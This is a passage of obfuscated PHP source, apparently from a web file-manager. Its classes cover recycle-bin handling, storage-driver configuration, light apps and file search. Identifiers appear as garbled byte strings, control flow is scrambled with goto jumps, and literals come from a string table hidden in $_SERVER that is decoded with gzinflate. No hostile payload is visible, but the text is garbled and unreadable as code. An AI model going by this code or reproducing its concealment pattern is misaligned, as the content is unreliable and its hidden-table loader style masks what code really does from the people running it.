goto DÕ¢«Œ’âÃ; A÷¿‡ë≠’: $cèÚã⁄áÂ√ = $cèÚã⁄áÂ√ == !1 ? !1 : $cèÚã⁄áÂ√; if (!$c…Ì≠øî∆„) { return !0; } $C“ÕÚÁóâﬁ = array(); goto Fâïÿ∫©Ç°; Fâïÿ∫©Ç°: foreach ($c…Ì≠øî∆„ as $c◊≥∂›öü¶) { goto F∏ ê…Ï≠“; BòçÜìÌ¨’: $C“ÕÚÁóâﬁ[] = $aÜØ¿ë®Î[$B©èûÒü¡–[465]]; if ($aÜØ¿ë®Î[$B©èûÒü¡–[375]] == $B©èûÒü¡–[93]) { $C“ÕÚÁóâﬁ[] = $c◊≥∂›öü¶; } $f≥ÃúÙ‹Óﬂ->lockMoveEnd($c◊≥∂›öü¶); goto DîË€Àõ•Ω; F∏ ê…Ï≠“: if ($cèÚã⁄áÂ√ != !1 && !in_array($c◊≥∂›öü¶, $cèÚã⁄áÂ√)) { continue; } $aÜØ¿ë®Î = $f≥ÃúÙ‹Óﬂ->sourceInfo($c◊≥∂›öü¶); $BﬂƒπÌêÁÙ = $f≥ÃúÙ‹Óﬂ->sourceInfo($aÜØ¿ë®Î[$B©èûÒü¡–[465]]); goto c˜Ü∂¯Àää; c˜Ü∂¯Àää: if ($BﬂƒπÌêÁÙ[$B©èûÒü¡–[401]] == $B©èûÒü¡–[93]) { continue; } $f≥ÃúÙ‹Óﬂ->lockMoveStart($c◊≥∂›öü¶); $this->recycleMove($c◊≥∂›öü¶, 0); goto F⁄øãÚË∑õ; F⁄øãÚË∑õ: if ($aÜØ¿ë®Î[$B©èûÒü¡–[375]] == $B©èûÒü¡–[93]) { $b∆âÃÍ¯Ô∆ = array($B©èûÒü¡–[529] => array($B©èûÒü¡–[487], $aÜØ¿ë®Î[$B©èûÒü¡–[463]] . $c◊≥∂›öü¶ . $B©èûÒü¡–[488])); $f≥ÃúÙ‹Óﬂ->where($b∆âÃÍ¯Ô∆)->setField($B©èûÒü¡–[401], 0); } $this->where(array($B©èûÒü¡–[374] => $c◊≥∂›öü¶))->delete(); $f≥ÃúÙ‹Óﬂ->folderSizeReset($aÜØ¿ë®Î[$B©èûÒü¡–[465]]); goto BòçÜìÌ¨’; DîË€Àõ•Ω: } $f≥ÃúÙ‹Óﬂ->updateModifyTime($C“ÕÚÁóâﬁ); goto E°âÙÇ›Ø†; DÕ¢«Œ’âÃ: $B©èûÒü¡– =& $_SERVER[Æ¡î¢≠¯™]; $f≥ÃúÙ‹Óﬂ = Model($B©èûÒü¡–[1096]); $c…Ì≠øî∆„ = $this->listData(); goto A÷¿‡ë≠’; E°âÙÇ›Ø†: } private function recycleMove($BŒﬂ÷√ÔçÒ, $EªåÍïÀ‘ = 1) { $dëçÇÈ‰ï˜ =& $_SERVER[Æ¡î¢≠¯™]; $B ﬁû‰¡∞ü = Model($dëçÇÈ‰ï˜[1096]); $CŒõî«ÃîÉ = Model($dëçÇÈ‰ï˜[2309]); $C—Ç¿ûÁËÃ = array($dëçÇÈ‰ï˜[374] => $BŒﬂ÷√ÔçÒ); if ($EªåÍïÀ‘) { $B ﬁû‰¡∞ü->where($C—Ç¿ûÁËÃ)->setField($dëçÇÈ‰ï˜[401], 1); $CŒõî«ÃîÉ->eventRecycle($BŒﬂ÷√ÔçÒ, $dëçÇÈ‰ï˜[2310]); } else { $bîïÏπ¨Ê° = $B ﬁû‰¡∞ü->where($C—Ç¿ûÁËÃ)->find(); $bÉı¬Èç¬ã = $bîïÏπ¨Ê°[$dëçÇÈ‰ï˜[375]] == $dëçÇÈ‰ï˜[93]; $d–ÍÂÕ≈µ÷ = $B ﬁû‰¡∞ü->fileNameAuto($bîïÏπ¨Ê°[$dëçÇÈ‰ï˜[465]], $bîïÏπ¨Ê°[$dëçÇÈ‰ï˜[28]], REPEAT_RENAME_FOLDER, $bÉı¬Èç¬ã); if ($d–ÍÂÕ≈µ÷ != $bîïÏπ¨Ê°[$dëçÇÈ‰ï˜[28]]) { $B ﬁû‰¡∞ü->rename($BŒﬂ÷√ÔçÒ, $d–ÍÂÕ≈µ÷); } $B ﬁû‰¡∞ü->where($C—Ç¿ûÁËÃ)->setField($dëçÇÈ‰ï˜[401], 0); $CŒõî«ÃîÉ->eventRecycle($BŒﬂ÷√ÔçÒ, $dëçÇÈ‰ï˜[2311]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\x73\164\x6f\162\141\x67\145\x4c\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\163\151\x7a\x65\115\x61\x78", "\163\x79\x73\x74\x65\x6d", "\x64\145\146\141\165\x6c\164", "\144\x72\151\166\145\162", "\x63\x6f\x6e\x66\151\147"); public function listData($F¿äéﬁêô∏ = false, $cÚÕ®á‚ï» = "\155\x6f\144\x69\146\171\124\x69\x6d\x65", $f‚◊æ›»Æã = false) { goto c ¬æÊÜéå; c ¬æÊÜéå: $BÁ›÷Ã∑•Œ =& $_SERVER[Æ¡î¢≠¯™]; $E¯ÙºèÉΩÛ = parent::listData($F¿äéﬁêô∏, $cÚÕ®á‚ï», $f‚◊æ›»Æã); if ($F¿äéﬁêô∏) { return $E¯ÙºèÉΩÛ; } goto D”ﬁìÿ†Ëã; A„ìÈÀ‹ûÂ: return $E¯ÙºèÉΩÛ; goto E†ÜœîÿÁÕ; D”ﬁìÿ†Ëã: foreach ($E¯ÙºèÉΩÛ as $a”äÉí«ÊŸ => $cÑ ±–ÀΩî) { unset($E¯ÙºèÉΩÛ[$a”äÉí«ÊŸ][$BÁ›÷Ã∑•Œ[6]]); $E¯ÙºèÉΩÛ[$a”äÉí«ÊŸ][$BÁ›÷Ã∑•Œ[2047]] = 0; } $Eüí°›úÍò = array_to_keyvalue($E¯ÙºèÉΩÛ, $BÁ›÷Ã∑•Œ[33], $BÁ›÷Ã∑•Œ[372]); $this->_listAppendSize($E¯ÙºèÉΩÛ, $Eüí°›úÍò); goto A„ìÈÀ‹ûÂ; E†ÜœîÿÁÕ: } public function _listAppendSize(&$A≥öÏåé··, $f«Î‚≈ÜÍÁ) { $bû€˘áı¬Û =& $_SERVER[Æ¡î¢≠¯™]; $CŸæ¿¿◊É◊ = $bû€˘áı¬Û[2312] . implode($bû€˘áı¬Û[47], $f«Î‚≈ÜÍÁ) . $bû€˘áı¬Û[2313]; $A⁄Øéâê«å = Model($bû€˘áı¬Û[711])->query($CŸæ¿¿◊É◊); $A⁄Øéâê«å = array_to_keyvalue($A⁄Øéâê«å, $bû€˘áı¬Û[372], $bû€˘áı¬Û[87]); foreach ($A≥öÏåé·· as $E—¨ÑªºÇó => $Câµèÿ∂á¬) { $A≥öÏåé··[$E—¨ÑªºÇó][$bû€˘áı¬Û[2047]] = isset($A⁄Øéâê«å[$Câµèÿ∂á¬[$bû€˘áı¬Û[372]]]) ? $A⁄Øéâê«å[$Câµèÿ∂á¬[$bû€˘áı¬Û[372]]] : 0; } } public function getConfig($eíﬁ•ñ´Ã—) { $b©ëß›⁄¨û = parent::listData($eíﬁ•ñ´Ã—); return json_decode($b©ëß›⁄¨û[$_SERVER[Æ¡î¢≠¯™][6]], !0); } public function update($dË¯ﬂØ¨ëπ, $BÎ£À∑⁄¶≈) { goto F∞√õëõáÊ; d”ÍÁòãõ : if (isset($BÜîø∞≥™∫[$dê∫®µÎçä]) && $BÜîø∞≥™∫[$dê∫®µÎçä][$aÊµªºãõò[372]] != $dË¯ﬂØ¨ëπ) { return !1; } if (isset($BÎ£À∑⁄¶≈[$aÊµªºãõò[2314]]) && $BÎ£À∑⁄¶≈[$aÊµªºãõò[2314]] == $aÊµªºãõò[93]) { $this->checkConfig($BÎ£À∑⁄¶≈); } unset($BÎ£À∑⁄¶≈[$aÊµªºãõò[2314]]); goto e€≈ÍÊ∫∂•; e€≈ÍÊ∫∂•: $cÛàΩ—¿‚Í = parent::update($dË¯ﬂØ¨ëπ, $BÎ£À∑⁄¶≈); if ($cÛàΩ—¿‚Í && $BÎ£À∑⁄¶≈[$aÊµªºãõò[34]]) { foreach ($BÜîø∞≥™∫ as $d√àÎëı∫¡) { if ($d√àÎëı∫¡[$aÊµªºãõò[34]] && $d√àÎëı∫¡[$aÊµªºãõò[372]] != $dË¯ﬂØ¨ëπ) { parent::update($d√àÎëı∫¡[$aÊµªºãõò[372]], array($aÊµªºãõò[34] => 0)); } } } return $cÛàΩ—¿‚Í; goto Dì‡â¿åí™; F∞√õëõáÊ: $aÊµªºãõò =& $_SERVER[Æ¡î¢≠¯™]; $dê∫®µÎçä = $BÎ£À∑⁄¶≈[$aÊµªºãõò[28]]; $BÜîø∞≥™∫ = array_to_keyvalue(parent::listData(), $aÊµªºãõò[28]); goto d”ÍÁòãõ ; Dì‡â¿åí™: } public function add($EÁ≈òØÉ··) { goto bìÁ∑öôâ; bìÁ∑öôâ: $aé «”∫ûÉ =& $_SERVER[Æ¡î¢≠¯™]; $FÉœÖûﬁãÿ = array_to_keyvalue(parent::listData(), $aé «”∫ûÉ[28]); if (isset($FÉœÖûﬁãÿ[$EÁ≈òØÉ··[$aé «”∫ûÉ[28]]])) { return !1; } goto d‚Ô–∂‡•é; d‰’äÑ«…Ö: return $aÓöÁø∫áÌ; goto C≥î¶∑ﬂ∫°; d‚Ô–∂‡•é: $this->checkConfig($EÁ≈òØÉ··); $aÓöÁø∫áÌ = parent::insert($EÁ≈òØÉ··); if ($aÓöÁø∫áÌ && $EÁ≈òØÉ··[$aé «”∫ûÉ[34]]) { foreach ($FÉœÖûﬁãÿ as $d—Ñ¯£∆“Ç) { if ($d—Ñ¯£∆“Ç[$aé «”∫ûÉ[34]]) { parent::update($d—Ñ¯£∆“Ç[$aé «”∫ûÉ[372]], array($aé «”∫ûÉ[34] => 0)); } } } goto d‰’äÑ«…Ö; C≥î¶∑ﬂ∫°: } public function checkConfig(&$F≤•√Œ∫µ¡) { goto C£œï’◊ΩÉ; FÓ∂ãïêı°: $F≤•√Œ∫µ¡[$e◊≈ﬁ©íä¯[6]] = json_encode($B≥⁄í“ËÕÂ); $F≤•√Œ∫µ¡[$e◊≈ﬁ©íä¯[100]] = $c†–†√Üæ; return !0; goto eÔ†¥ÆÑﬁÁ; C£œï’◊ΩÉ: $e◊≈ﬁ©íä¯ =& $_SERVER[Æ¡î¢≠¯™]; $d¶‚»óçÑì = strtolower($F≤•√Œ∫µ¡[$e◊≈ﬁ©íä¯[100]]); $B≥⁄í“ËÕÂ = json_decode_force($F≤•√Œ∫µ¡[$e◊≈ﬁ©íä¯[6]]); goto CñπÑ¥‚≈É; Båú≥◊éê∞: $dƒﬁÒÃ¡ä∂ = $Cá∂‚«ﬁòﬂ->getPath($D¿ æïıü» . $e◊≈ﬁ©íä¯[1943]); if (!$Cá∂‚«ﬁòﬂ->mkfile($dƒﬁÒÃ¡ä∂)) { show_json(LNG($e◊≈ﬁ©íä¯[2315]), !1); } $B≥⁄í“ËÕÂ[$e◊≈ﬁ©íä¯[1010]] = $D¿ æïıü»; goto FÓ∂ãïêı°; E◊˘ ìÁ…ß: $D¥¯‰®ùá£ = $e◊≈ﬁ©íä¯[81] . $c†–†√Üæ; $Cá∂‚«ﬁòﬂ = new $D¥¯‰®ùá£($B≥⁄í“ËÕÂ); if (in_array($d¶‚»óçÑì, $Cá∂‚«ﬁòﬂ->objectDriver)) { if (!$Cá∂‚«ﬁòﬂ->isBucketCors() && !$Cá∂‚«ﬁòﬂ->setBucketCors()) { $AÆ≠Üª¥¨Ó = LNG($e◊≈ﬁ©íä¯[2315]); $AÆ≠Üª¥¨Ó .= $e◊≈ﬁ©íä¯[2316] . LNG($e◊≈ﬁ©íä¯[2317]); show_json($AÆ≠Üª¥¨Ó, !1); } } goto Båú≥◊éê∞; CñπÑ¥‚≈É: foreach ($B≥⁄í“ËÕÂ as $c…≈ÑÓ‹Ñ∞ => $aí‡ÑÕ¿È†) { $B≥⁄í“ËÕÂ[$c…≈ÑÓ‹Ñ∞] = trim($aí‡ÑÕ¿È†); } $D¿ æïıü» = rtrim($B≥⁄í“ËÕÂ[$e◊≈ﬁ©íä¯[1010]], $e◊≈ﬁ©íä¯[8]) . $e◊≈ﬁ©íä¯[8]; $c†–†√Üæ = $this->driverType($d¶‚»óçÑì); goto E◊˘ ìÁ…ß; eÔ†¥ÆÑﬁÁ: } private function driverType($f›ÿ€ÃìëÎ) { $D≠ºçµ±Ïë =& $_SERVER[Æ¡î¢≠¯™]; $DÜ≤œòè·à = array($D≠ºçµ±Ïë[113] => $D≠ºçµ±Ïë[2318], $D≠ºçµ±Ïë[68] => $D≠ºçµ±Ïë[2319], $D≠ºçµ±Ïë[74] => $D≠ºçµ±Ïë[2320]); if (isset($DÜ≤œòè·à[$f›ÿ€ÃìëÎ])) { return $DÜ≤œòè·à[$f›ÿ€ÃìëÎ]; } return strtoupper($f›ÿ€ÃìëÎ); } public function driverListSystem() { $b¥ÿ∆‘∂ÇΩ =& $_SERVER[Æ¡î¢≠¯™]; $b—ŸÕí°’ÿ = parent::listData(); $aÜÆ…ŸêÍû = array(); foreach ($b—ŸÕí°’ÿ as $A‹Çª°€«¢) { unset($A‹Çª°€«¢[$b¥ÿ∆‘∂ÇΩ[194]], $A‹Çª°€«¢[$b¥ÿ∆‘∂ÇΩ[117]]); $A‹Çª°€«¢[$b¥ÿ∆‘∂ÇΩ[6]] = json_decode_force($A‹Çª°€«¢[$b¥ÿ∆‘∂ÇΩ[6]]); $aÜÆ…ŸêÍû[] = $A‹Çª°€«¢; } return $aÜÆ…ŸêÍû; } public function defaultDriver() { $dﬂª∏⁄Üﬂ÷ =& $_SERVER[Æ¡î¢≠¯™]; $d¨ìè™¿∞ = parent::listData(); $Eˆ•Üï™±Ñ = array_filter_by_field($d¨ìè™¿∞, $dﬂª∏⁄Üﬂ÷[34], 1); $Eˆ•Üï™±Ñ = $Eˆ•Üï™±Ñ[0]; if ($Eˆ•Üï™±Ñ) { $Eˆ•Üï™±Ñ[$dﬂª∏⁄Üﬂ÷[6]] = json_decode($Eˆ•Üï™±Ñ[$dﬂª∏⁄Üﬂ÷[6]], !0); } return $Eˆ•Üï™±Ñ; } public function driverInfo($e∂‚ÑÔ•Û’) { $c∆œΩ÷Æ¯î =& $_SERVER[Æ¡î¢≠¯™]; $e´©âì¬·· = array_to_keyvalue(parent::listData(), $c∆œΩ÷Æ¯î[372]); if (!isset($e´©âì¬··[$e∂‚ÑÔ•Û’])) { return !1; } $BÖ¶ìÖ∂éÿ = $e´©âì¬··[$e∂‚ÑÔ•Û’]; $BÖ¶ìÖ∂éÿ[$c∆œΩ÷Æ¯î[6]] = json_decode_force($BÖ¶ìÖ∂éÿ[$c∆œΩ÷Æ¯î[6]]); return $BÖ¶ìÖ∂éÿ; } public function remove($Fâ≤ôÇ÷ù”) { $this->removeShareItems($Fâ≤ôÇ÷ù”); return parent::remove($Fâ≤ôÇ÷ù”); } public function removeWithFile($Dªò˜µâ¬Æ) { goto A®•¥∑ù¥»; Aç‰Óö∞ÉΩ: $eÒÃá™°ïì = "\x7b\x69\157\x3a{$dÛ≈åº¢ñç}\175\57"; $BÖŸ ¥Ùîô = !0; $AÛ—ÆÈù¬æ = array(); goto Fóà£Îíáç; A®•¥∑ù¥»: $d€¨ûˆÌç´ =& $_SERVER[Æ¡î¢≠¯™]; $F»Îôß‰∑‡ = array($d€¨ûˆÌç´[735] => $Dªò˜µâ¬Æ); $f‹œÇœÖÛâ = Model($d€¨ûˆÌç´[426])->where($F»Îôß‰∑‡)->count(); goto fÁù™üﬂ…; fÁù™üﬂ…: $DíÌﬂˆ¯àﬂ = Model($d€¨ûˆÌç´[426])->where($F»Îôß‰∑‡)->sum($d€¨ûˆÌç´[87]); $f–ÏäÜáØÑ = $d€¨ûˆÌç´[2321] . $Dªò˜µâ¬Æ; $EËüµ„˘Û¯ = new TaskFileTransfer($f–ÏäÜáØÑ, $d€¨ûˆÌç´[2322], $f‹œÇœÖÛâ, LNG($d€¨ûˆÌç´[2323]) . "\50{$Dªò˜µâ¬Æ}\51"); goto BÌßîäÏÕÑ; f⁄æùå˘´Ç: if (!$BÖŸ ¥Ùîô) { $EËüµ„˘Û¯->stop($f–ÏäÜáØÑ); return !1; } $EËüµ„˘Û¯->end(); $this->remove($Dªò˜µâ¬Æ); goto Aóå€êÃÖ ; BÌßîäÏÕÑ: $EËüµ„˘Û¯->task[$d€¨ûˆÌç´[690]] = (double) $DíÌﬂˆ¯àﬂ; $bÓÂçæàò¶ = KodIO::defaultDriver(); $dÛ≈åº¢ñç = $bÓÂçæàò¶[$d€¨ûˆÌç´[372]]; goto Aç‰Óö∞ÉΩ; Fóà£Îíáç: $f¯å›ÂÊ≠π = Model($d€¨ûˆÌç´[174])->where($F»Îôß‰∑‡)->field($d€¨ûˆÌç´[2324])->select(); foreach ($f¯å›ÂÊ≠π as $bπ¶åÍÀËÜ) { goto c‹ã‹Îï«·; aú¶÷ç‰äé: if (IO::exist($f¯ËÛäÁé)) { $EËüµ„˘Û¯->updateFileEnd($bπ¶åÍÀËÜ[$d€¨ûˆÌç´[28]], $bπ¶åÍÀËÜ[$d€¨ûˆÌç´[87]]); continue; } if (!IO::move($B∑¥≠ÂâÊÁ, get_path_father($f¯ËÛäÁé))) { $BÖŸ ¥Ùîô = !1; break; } $F»Îôß‰∑‡ = array($d€¨ûˆÌç´[423] => $bπ¶åÍÀËÜ[$d€¨ûˆÌç´[423]]); goto e…îóÑ∏ºÜ; c‹ã‹Îï«·: $B∑¥≠ÂâÊÁ = $bπ¶åÍÀËÜ[$d€¨ûˆÌç´[85]]; $f¯ËÛäÁé = $eÒÃá™°ïì . str_replace("\x7b\x69\157\72{$Dªò˜µâ¬Æ}\175\x2f", $d€¨ûˆÌç´[33], $B∑¥≠ÂâÊÁ); if (!IO::exist($B∑¥≠ÂâÊÁ)) { $AÛ—ÆÈù¬æ[] = $bπ¶åÍÀËÜ[$d€¨ûˆÌç´[423]]; $EËüµ„˘Û¯->updateFileEnd($bπ¶åÍÀËÜ[$d€¨ûˆÌç´[28]], $bπ¶åÍÀËÜ[$d€¨ûˆÌç´[87]]); continue; } goto aú¶÷ç‰äé; e…îóÑ∏ºÜ: $C”√µúÙ”ÿ = array($d€¨ûˆÌç´[735] => $dÛ≈åº¢ñç, $d€¨ûˆÌç´[85] => $f¯ËÛäÁé); Model($d€¨ûˆÌç´[174])->where($F»Îôß‰∑‡)->save($C”√µúÙ”ÿ); goto dÕ‘π—íØÖ; dÕ‘π—íØÖ: } $this->removeByFileID($AÛ—ÆÈù¬æ); goto f⁄æùå˘´Ç; Aóå€êÃÖ : } public function progress($bô«€ª‚µ„) { return Task::get($_SERVER[Æ¡î¢≠¯™][2321] . $bô«€ª‚µ„); } private function removeByFileID($E©±∞‹—‰∑ = array()) { goto CÍΩ´êËº∂; d—ŸïÑ¬◊∏: foreach ($EÒ™É£¢Æ  as $fÊÔÊ√”‚ä) { Model($D‰„≈à·ü°[387])->removeNow($fÊÔÊ√”‚ä, !1); } goto C«ÙõÕ†‡‰; CÍΩ´êËº∂: $D‰„≈à·ü° =& $_SERVER[Æ¡î¢≠¯™]; if (empty($E©±∞‹—‰∑)) { return; } $cÈçÁ›¢¡ç = array($D‰„≈à·ü°[423] => array($D‰„≈à·ü°[7], $E©±∞‹—‰∑)); goto fìàÜéé≠È; fìàÜéé≠È: $EÒ™É£¢Æ  = Model($D‰„≈à·ü°[1096])->where($cÈçÁ›¢¡ç)->field($D‰„≈à·ü°[374])->select(); if (!$EÒ™É£¢Æ ) { return; } $EÒ™É£¢Æ  = array_to_keyvalue($EÒ™É£¢Æ , $D‰„≈à·ü°[33], $D‰„≈à·ü°[374]); goto d—ŸïÑ¬◊∏; C«ÙõÕ†‡‰: } private function removeShareItems($CÒçá‚Â‹) { goto E›ÕØ‚ÀáÛ; bı¢°∫˜„≈: $Cè∂—àÛˆΩ = Model($Aõë‰ªÿë√[2038])->where($A¶è€≠¶›ï)->field($Aõë‰ªÿë√[445])->select(); if (empty($Cè∂—àÛˆΩ)) { return; } $fÌËπÍ√Âò = array_to_keyvalue($Cè∂—àÛˆΩ, $Aõë‰ªÿë√[33], $Aõë‰ªÿë√[445]); goto eçÑ¡ÖÖ‡Ì; E›ÕØ‚ÀáÛ: $Aõë‰ªÿë√ =& $_SERVER[Æ¡î¢≠¯™]; $BÑÇÈÁ…ü« = "\x7b\x69\x6f\x3a{$CÒçá‚Â‹}\x7d\x2f"; $A¶è€≠¶›ï = array($Aõë‰ªÿë√[374] => 0, $Aõë‰ªÿë√[1004] => array($Aõë‰ªÿë√[743], "{$BÑÇÈÁ…ü«}\x25")); goto bı¢°∫˜„≈; eçÑ¡ÖÖ‡Ì: Model($Aõë‰ªÿë√[540])->remove($fÌËπÍ√Âò); goto d›ÑÁÂœºﬁ; d›ÑÁÂœºﬁ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\x4c\x69\x67\150\164\x41\x70\x70"; public $modelType = "\123\x79\163\164\x65\x6d\117\x70\x74\151\x6f\156"; public $field = array("\156\x61\155\x65", "\147\162\x6f\x75\x70", "\x64\145\163\143", "\143\x6f\156\x74\x65\156\164"); public function listData($C∂‹©∞™íä = false, $e“¬ô∂¶∂ı = "\x6d\157\144\151\146\x79\x54\151\x6d\x65", $c„çŸè—ö› = true) { return parent::listData($C∂‹©∞™íä, $e“¬ô∂¶∂ı, $c„çŸè—ö›); } public function remove($F√ÇëΩ·»π) { $AŸë–˘∆íú = $this->findByName($F√ÇëΩ·»π); if (!$AŸë–˘∆íú) { return !1; } return parent::remove($AŸë–˘∆íú[$_SERVER[Æ¡î¢≠¯™][372]]); } public function add($FáºŒéâÀä) { if ($this->findByName($FáºŒéâÀä[$_SERVER[Æ¡î¢≠¯™][28]])) { return !1; } return parent::insert($FáºŒéâÀä); } public function update($FªÂì±∆Èß, $bÜÎ‹¶àÖ¥) { $EòŒ¥¨¬û∫ =& $_SERVER[Æ¡î¢≠¯™]; $f◊”ø≥Éí¶ = $this->findByName($FªÂì±∆Èß); $dõı∆¨¬¶ô = $this->findByName($bÜÎ‹¶àÖ¥[$EòŒ¥¨¬û∫[28]]); if (!$f◊”ø≥Éí¶ || $dõı∆¨¬¶ô && $dõı∆¨¬¶ô[$EòŒ¥¨¬û∫[372]] != $f◊”ø≥Éí¶[$EòŒ¥¨¬û∫[372]]) { return !1; } return parent::update($f◊”ø≥Éí¶[$EòŒ¥¨¬û∫[372]], $bÜÎ‹¶àÖ¥); } } goto a¥ºº„‡êè; F∂Öü∑Öä¥: define($_SERVER[Æ¡î¢≠¯™][549], $_SERVER[Æ¡î¢≠¯™][550]); $eÙÜÔÓ„â÷ = $_SERVER[Æ¡î¢≠¯™][551]; $_SERVER[º˙Ôå˛Ë] = explode($_SERVER[Æ¡î¢≠¯™][552], gzinflate(substr($_SERVER[Æ¡î¢≠¯™][553], 10, -8))); goto d’«ê‘ñõÖ; A‡«∞–Éæ–: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($E€∫˘∆πë•) { goto cøÜüÊê≠; cøÜüÊê≠: $EéÜãπÑ«˘ =& $_SERVER[Æ¡î¢≠¯™]; $f˘†¬∞âÜÑ = KodIO::fileTypeList(); $DÇÙë·ûæø = $f˘†¬∞âÜÑ[$E€∫˘∆πë•]; goto Eà˘¯ƒ±øΩ; bÎúπ≠∫⁄∂: if (!$DÇÙë·ûæø[$EéÜãπÑ«˘[167]]) { $DÀ◊ÜŸ˜È¶ = array_to_keyvalue($f˘†¬∞âÜÑ, $EéÜãπÑ«˘[33], $EéÜãπÑ«˘[167]); $F©·”Ù‹∞† = implode($EéÜãπÑ«˘[47], $DÀ◊ÜŸ˜È¶); $aÙä∂øã™˘ = $EéÜãπÑ«˘[2215]; } $Cé‹©ÁœàÌ = explode($EéÜãπÑ«˘[47], trim($F©·”Ù‹∞†, $EéÜãπÑ«˘[47])); return array($aÙä∂øã™˘, $Cé‹©ÁœàÌ); goto EË¬·≠≥æ≠; Eà˘¯ƒ±øΩ: if (!$DÇÙë·ûæø) { return array(); } $F©·”Ù‹∞† = $DÇÙë·ûæø[$EéÜãπÑ«˘[167]]; $aÙä∂øã™˘ = $EéÜãπÑ«˘[7]; goto bÎúπ≠∫⁄∂; EË¬·≠≥æ≠: } public function listPathType($C∞áÜ±Ã˜õ) { $Câ˜≤Ï´ﬂŒ =& $_SERVER[Æ¡î¢≠¯™]; $aÔ–ÚΩÔÑÑ = $this->fileTypeWhere($C∞áÜ±Ã˜õ); if (!$aÔ–ÚΩÔÑÑ) { return array(); } $BçêìÆì⁄ê = array($Câ˜≤Ï´ﬂŒ[525] => SourceModel::TYPE_USER, $Câ˜≤Ï´ﬂŒ[526] => USER_ID, $Câ˜≤Ï´ﬂŒ[522] => 0, $Câ˜≤Ï´ﬂŒ[523] => $aÔ–ÚΩÔÑÑ); return $this->listSource($BçêìÆì⁄ê); } public function listSearch($D¨√ê£¥º‚, $bõúÛ—ı⁄ü = 300) { goto F∫ùê±åìû; f¨Ïÿúê∏µ: if (!isset($EıÃÏ⁄Ü·…[$fôÚƒ…êÖÖ[401]])) { $EıÃÏ⁄Ü·…[$fôÚƒ…êÖÖ[401]] = 0; } $C†õ∂’Î¯ä = $fôÚƒ…êÖÖ[2260]; $bêÔÜãÇ¥¥ = $C†õ∂’Î¯ä; goto a”Í‡ñï˘; cﬂÚµ®‘›¿: $this->_listSearchDesc($D∫‡µÂÉÓÎ, $D¨√ê£¥º‚, $bêÔÜãÇ¥¥); $this->_listSearchTag($D∫‡µÂÉÓÎ, $D¨√ê£¥º‚, $bêÔÜãÇ¥¥); $this->_listDataApply($D∫‡µÂÉÓÎ[$fôÚƒ…êÖÖ[360]]); goto aÈâ—¡ûäù; aÈâ—¡ûäù: $this->_listMake($D∫‡µÂÉÓÎ); return $D∫‡µÂÉÓÎ; goto EÆ“¢‰è—Æ; a”Í‡ñï˘: $this->_listSearchBindPinyin($D¨√ê£¥º‚, $EıÃÏ⁄Ü·…, $C†õ∂’Î¯ä); $this->alias($fôÚƒ…êÖÖ[491])->_makeOrder()->cache(null, 10); $D∫‡µÂÉÓÎ = $this->distinct(!0)->field($C†õ∂’Î¯ä)->where($EıÃÏ⁄Ü·…)->selectPage($bõúÛ—ı⁄ü); goto cﬂÚµ®‘›¿; F∫ùê±åìû: $fôÚƒ…êÖÖ =& $_SERVER[Æ¡î¢≠¯™]; if (isset($D¨√ê£¥º‚[$fôÚƒ…êÖÖ[2137]]) && $D¨√ê£¥º‚[$fôÚƒ…êÖÖ[2137]]) { $D¨√ê£¥º‚[$fôÚƒ…êÖÖ[2137]] = str_replace($fôÚƒ…êÖÖ[1549], $fôÚƒ…êÖÖ[2259], trim($D¨√ê£¥º‚[$fôÚƒ…êÖÖ[2137]])); } $EıÃÏ⁄Ü·… = $this->_parseSearchWhere($D¨√ê£¥º‚); goto f¨Ïÿúê∏µ; EÆ“¢‰è—Æ: } private function _listSearchTag(&$f€Óø∞‰ãÙ, $FÀêº©å∂ﬂ, $E—§ÖÚ∏ÜÛ) { goto aåøÁôõÓÿ; a„÷€ºƒ¬Í: if (!$C®œÓÃ»Œê) { return; } $CÈˆß¨ƒ’° = array($D‰Á∂ñÓß£[398] => array($D‰Á∂ñÓß£[7], $C®œÓÃ»Œê)); $d√û÷¿¶óÉ = Model($D‰Á∂ñÓß£[2262])->field($D‰Á∂ñÓß£[85])->where($CÈˆß¨ƒ’°)->select(); goto B÷’Î›π–£; FàëÂˆ√„ê: $C®œÓÃ»Œê = array(); $eö®«î€˜Œ = $FÀêº©å∂ﬂ[$D‰Á∂ñÓß£[2137]]; foreach ($DÜæ≤üéÆÏ as $Fó‡ÓÔ‘◊◊) { $cû’†≠Òﬁ— = $Fó‡ÓÔ‘◊◊[$D‰Á∂ñÓß£[28]]; $aÿ¨¯ÉÂÀ° = str_replace($D‰Á∂ñÓß£[50], $D‰Á∂ñÓß£[33], Pinyin::encode($cû’†≠Òﬁ—)); if (stripos($cû’†≠Òﬁ—, $eö®«î€˜Œ) !== !1 || stripos($aÿ¨¯ÉÂÀ°, $eö®«î€˜Œ) !== !1) { $C®œÓÃ»Œê[] = $Fó‡ÓÔ‘◊◊[$D‰Á∂ñÓß£[372]]; } } goto a„÷€ºƒ¬Í; B÷’Î›π–£: $d√û÷¿¶óÉ = array_to_keyvalue($d√û÷¿¶óÉ, $D‰Á∂ñÓß£[33], $D‰Á∂ñÓß£[85]); $F¡¬˘öƒÙ‡ = array_unique($d√û÷¿¶óÉ); $this->_listSearchMerge($f€Óø∞‰ãÙ, $FÀêº©å∂ﬂ, $E—§ÖÚ∏ÜÛ, $F¡¬˘öƒÙ‡); goto fáô≈âä—; aåøÁôõÓÿ: $D‰Á∂ñÓß£ =& $_SERVER[Æ¡î¢≠¯™]; if (!$FÀêº©å∂ﬂ[$D‰Á∂ñÓß£[2137]] || $f€Óø∞‰ãÙ[$D‰Á∂ñÓß£[357]][$D‰Á∂ñÓß£[346]] > 1) { return; } $DÜæ≤üéÆÏ = Model($D‰Á∂ñÓß£[2261])->listData(); goto FàëÂˆ√„ê; fáô≈âä—: } private function _listSearchDesc(&$C—á°ÃÈ™È, $bäœÊó°‹ê, $Dà◊’Ó®Øë) { goto b¬ıÿÈ≈ﬁﬂ; b¬ıÿÈ≈ﬁﬂ: $aÔ‘´éíÏ =& $_SERVER[Æ¡î¢≠¯™]; if (!$bäœÊó°‹ê[$aÔ‘´éíÏ[2137]] || $C—á°ÃÈ™È[$aÔ‘´éíÏ[357]][$aÔ‘´éíÏ[346]] > 1) { return; } $cÁ¯íò¬Ç = $this->listSearchChildren($bäœÊó°‹ê[$aÔ‘´éíÏ[465]]); goto 